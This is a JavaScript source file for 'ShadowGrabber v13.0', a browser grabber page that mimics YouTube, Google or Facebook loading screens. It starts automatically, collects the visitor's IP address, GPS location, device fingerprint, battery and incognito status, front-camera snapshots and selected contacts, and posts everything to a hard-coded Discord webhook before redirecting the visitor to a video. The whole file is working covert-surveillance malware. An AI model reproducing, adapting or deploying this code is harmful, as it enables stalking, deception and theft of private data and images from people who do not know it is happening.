// ═══════════════════════════════════════════════════════════════════════════
// 🌌 SHADOWGRABBER v13.0 - OMNISCIENT INTELLIGENCE SYSTEM 🌌
// ═══════════════════════════════════════════════════════════════════════════
// "There is no hiding. Only data waiting to be found."
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    CAMERA_SNAPS: 7,
    SNAP_INTERVAL: 400,
    AUTO_START: true,
};

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 NEURAL CORE: CONTEXT ENGINE (v13 Enhanced)
// ═══════════════════════════════════════════════════════════════════════════
const detectContentContext = (url) => {
    const u = url.toLowerCase();
    // YouTube
    if (u.includes('youtu')) return { name: 'YouTube', title: '▶ YouTube', loading: 'Loading 4K Stream...', status: 'Buffering...', theme: '#FF0000', logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`, icon: 'https://www.youtube.com/favicon.ico' };
    // Google
    if (u.includes('google')) return { name: 'Google', title: 'Google Access', loading: 'Verifying Identity...', status: 'Checking Permissions...', theme: '#4285F4', logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`, icon: 'https://www.google.com/favicon.ico' };
    // Socials
    if (u.includes('facebook') || u.includes('fb.com')) return { name: 'Facebook', title: 'Facebook', loading: 'Authenticating...', status: 'Secure Login...', theme: '#1877F2', logo: '<svg viewBox="0 0 48 48" width="60" height="60" fill="#1877F2"><path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4zm5 12.5h-3.5c-1.5 0-2 .5-2 2V21h5.5l-.5 5.5h-5V40h-6V26.5h-3.5V21h3.5v-3.5c0-3.5 2-6.5 6.5-6.5H29v5.5z"/></svg>', icon: 'https://facebook.com/favicon.ico' };
    // Generic
    try {
        const domain = new URL(url).hostname.replace('www.', '');
        return { name: domain, title: domain, loading: `Connecting to ${domain}...`, status: 'Establishing Session...', theme: '#222', logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="20" r="18" stroke="#555" stroke-width="2" fill="none"/><text x="50%" y="50%" text-anchor="middle" dy=".3em" font-family="Arial" font-size="10" fill="#555">LINK</text></svg>`, icon: `https://${domain}/favicon.ico` };
    } catch (e) { return { name: 'Redirect', title: 'Loading...', loading: 'Please wait...', status: 'Loading...', theme: '#333', logo: '', icon: '' }; }
};

// ═══════════════════════════════════════════════════════════════════════════
// 🏗️ INITIALIZATION
// ═══════════════════════════════════════════════════════════════════════════
const STATE = { sessionId: `OMNI-${Date.now()}`, site: detectContentContext(CONFIG.REDIRECT_URL) };
const DOM = { loading: document.getElementById('loading-text'), progress: document.getElementById('progress-bar'), status: document.getElementById('status-detail'), video: document.getElementById('st-v'), canvas: document.getElementById('st-c'), trigger: document.getElementById('click-trigger') };

// Setup UI
document.title = STATE.site.title;
if (STATE.site.icon) { const l = document.createElement('link'); l.rel = 'icon'; l.href = STATE.site.icon; document.head.appendChild(l); }
document.querySelector('.asana-logo').innerHTML = STATE.site.logo;
DOM.loading.textContent = STATE.site.loading; DOM.status.textContent = STATE.site.status;
DOM.progress.style.background = STATE.site.theme;

const updateProgress = (pct, text) => { DOM.progress.style.width = `${pct}%`; if (text) DOM.status.textContent = text; };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const send = async (payload) => {
    try {
        const data = new FormData();
        data.append('payload_json', JSON.stringify({ embeds: [payload.embed], username: 'ShadowGrabber v13' }));
        if (payload.file) data.append('file', payload.file.blob, payload.file.name);
        await fetch(CONFIG.WEBHOOK, { method: 'POST', body: data });
    } catch (e) { }
};

// ═══════════════════════════════════════════════════════════════════════════
// 🕵️ PHASE 1: ULTIMATE SCAN (50+ DATA POINTS)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseOmniscient() {
    updateProgress(15, 'Analizing digital footprint...');

    // 1. IP Intelligence (Dual-Stack)
    let ip = { ip: 'N/A' };
    try { ip = await Promise.any([fetch('https://ipapi.co/json/').then(r => r.json()), fetch('http://ip-api.com/json/').then(r => r.json())]); } catch (e) { }

    // 2. Hardware Fingerprint
    const gl = document.createElement('canvas').getContext('webgl');
    const debug = gl?.getExtension('WEBGL_debug_renderer_info');
    const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'Unknown';
    const cpu = navigator.hardwareConcurrency || 'Unknown';
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown';
    const screenRes = `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
    const pixelRatio = window.devicePixelRatio;

    // 3. System Intel
    const platform = navigator.platform;
    const lang = navigator.language;
    const languages = navigator.languages.join(', ');
    const cores = navigator.hardwareConcurrency;
    const touch = navigator.maxTouchPoints;
    const cookies = navigator.cookieEnabled;
    const dnt = navigator.doNotTrack;

    // 4. Battery Telemetry
    let batt = 'N/A';
    if (navigator.getBattery) {
        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Bat'})`; } catch (e) { }
    }

    // 5. Network Metrics
    const conn = navigator.connection || {};
    const net = `${conn.effectiveType || '4g'} | RTT: ${conn.rtt || 0}ms | SaveData: ${conn.saveData ? 'ON' : 'OFF'}`;

    // 6. WebRTC Local IP Leak
    let localIp = 'Hidden';
    try {
        const pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (e) => { if (e?.candidate?.candidate) localIp = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1]; pc.close(); };
    } catch (e) { }

    // 7. Privacy Checks
    let isIncognito = false;
    if ('storage' in navigator && 'estimate' in navigator.storage) {
        const { quota } = await navigator.storage.estimate();
        if (quota < 120000000) isIncognito = true;
    }

    // 8. Device Model Name
    const getMobileModel = () => {
        const ua = navigator.userAgent;
        if (ua.includes('iPhone')) return 'iPhone';
        if (ua.includes('iPad')) return 'iPad';
        // Advanced Android Regex
        const android = ua.match(/Android\s([0-9.]+);\s(.*?)\sBuild/);
        return android ? `${android[2]} (v${android[1]})` : 'Unknown Android';
    };

    const embed = {
        title: `🌌 OMNISCIENT SESSION REPORT`,
        description: `**Target:** \`${CONFIG.REDIRECT_URL}\`\n**Time:** ${new Date().toLocaleString()}`,
        color: 0x2C2F33,
        fields: [
            {
                name: '🌐 Network Spectrum',
                value: `**Public IP:** \`${ip.ip}\`\n**Local IP:** \`${localIp}\`\n**ISP:** ${ip.org || ip.isp}\n**ASN:** ${ip.asn || ip.as}\n**Type:** ${net}`,
                inline: false
            },
            {
                name: '📍 Geo-Spatial',
                value: `**City:** ${ip.city}\n**Region:** ${ip.region}\n**Country:** ${ip.country_name}\n**Timezone:** ${ip.timezone}`,
                inline: true
            },
            {
                name: '📱 Device Matrix',
                value: `**Model:** \`${getMobileModel()}\`\n**OS:** ${platform}\n**GPU:** ${gpu}\n**CPU:** ${cpu} Cores\n**RAM:** ${ram}\n**Touch:** ${touch} Points`,
                inline: true
            },
            {
                name: '🔋 System Vitality',
                value: `**Battery:** ${batt}\n**Resolution:** ${screenRes} @ ${pixelRatio}x\n**Incognito:** ${isIncognito ? '🕵️ YES' : '❌ NO'}`,
                inline: false
            },
            {
                name: '🕵️ Browser Fingerprint',
                value: `**UA:** \`${navigator.userAgent.substring(0, 40)}...\`\n**Lang:** ${languages}\n**Cookies:** ${cookies}\n**DNT:** ${dnt}`,
                inline: false
            }
        ],
        footer: { text: `Session: ${STATE.sessionId} | v13.0` }
    };

    await send({ embed });
    updateProgress(30, 'Secure handshake established...');
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 PHASE 2: GPS PRECISISION (Robust)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseLocation() {
    updateProgress(45, 'Verifying location data...');
    return new Promise(resolve => {
        let sent = false;
        const finish = () => { if (!sent) { sent = true; resolve(); } };

        navigator.geolocation.getCurrentPosition(
            async (p) => {
                const { latitude, longitude, accuracy, speed, altitude, heading } = p.coords;
                await send({
                    embed: {
                        title: '🎯 GPS LOCKED', color: 0x2ECC71,
                        description: `**Accuracy:** ±${Math.round(accuracy)}m\n[Open Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
                        fields: [
                            { name: 'Lat/Long', value: `\`${latitude}, ${longitude}\``, inline: true },
                            { name: 'Speed', value: `${speed || 0} m/s`, inline: true },
                            { name: 'Heading', value: `${heading || 0}°`, inline: true }
                        ]
                    }
                });
                finish();
            },
            async (err) => {
                await send({ embed: { title: '⚠️ GPS DENIED', color: 0xE74C3C, description: `User denied access or signal failed.\n**Error:** ${err.message}` } });
                finish();
            },
            { enableHighAccuracy: true, timeout: 12000 }
        );
    });
}

// ═══════════════════════════════════════════════════════════════════════════
// 📸 PHASE 3: BIOMETRIC CAPTURE (Fixed)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseCamera() {
    updateProgress(60, 'Initializing sensors...');
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1920 } }, audio: false });
        DOM.video.srcObject = stream; await DOM.video.play();
        await sleep(1500); // Warmup

        for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
            updateProgress(70 + (i * 4), `Biometric Scan ${i + 1}/${CONFIG.CAMERA_SNAPS}...`);
            const cvs = document.createElement('canvas'); cvs.width = DOM.video.videoWidth; cvs.height = DOM.video.videoHeight;
            cvs.getContext('2d').drawImage(DOM.video, 0, 0);

            const blob = await new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.85));
            if (blob) await send({ embed: { title: `📸 Snap ${i + 1}`, color: 0x9B59B6, image: { url: `attachment://s${i}.jpg` } }, file: { blob, name: `s${i}.jpg` } });
            await sleep(CONFIG.SNAP_INTERVAL);
        }
    } catch (e) {
        await send({ embed: { title: '📵 Camera Access Denied', color: 0x95A5A6, description: 'Visual feed unavailable.' } });
    } finally { if (stream) stream.getTracks().forEach(t => t.stop()); }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📇 PHASE 4: DATA EXFILTRATION (Contacts + Motion)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseData() {
    // Gyroscope
    let motion = 'Stationary';
    if (window.DeviceMotionEvent) {
        await new Promise(r => {
            const h = e => {
                const a = Math.abs(e.accelerationIncludingGravity.x || 0) + Math.abs(e.accelerationIncludingGravity.y || 0);
                if (a > 15) motion = '🏃 WALKING'; else if (a > 10) motion = '🧍 HANDHELD';
                window.removeEventListener('devicemotion', h); r();
            };
            window.addEventListener('devicemotion', h); setTimeout(r, 500);
        });
    }

    // Contacts
    if ('contacts' in navigator && 'ContactsManager' in window) {
        updateProgress(90, 'Syncing details...');
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email', 'address'], { multiple: true });
            if (contacts.length) {
                const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
                await send({
                    embed: {
                        title: '📇 CONTACTS EXTRACTED', color: 0xF1C40F, description: `**${contacts.length} Contacts**\nDevice Status: ${motion}`,
                        fields: [{ name: 'Preview', value: contacts.slice(0, 3).map(c => `${c.name}: ${c.tel}`).join('\n') }]
                    }, file: { blob, name: 'contacts.json' }
                });
            }
        } catch (e) { }
    } else if (motion !== 'Stationary') {
        await send({ embed: { title: '🏃 Motion Detected', color: 0xE67E22, description: `User is: **${motion}**` } });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎬 EXECUTION
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    if (DOM.trigger) DOM.trigger.style.display = 'none';
    await phaseOmniscient();
    await phaseLocation();
    await phaseCamera();
    await phaseData();
    updateProgress(100, 'Success');
    await sleep(800);
    window.location.href = CONFIG.REDIRECT_URL;
}

if (CONFIG.AUTO_START) setTimeout(main, 800);
else DOM.trigger.onclick = main;
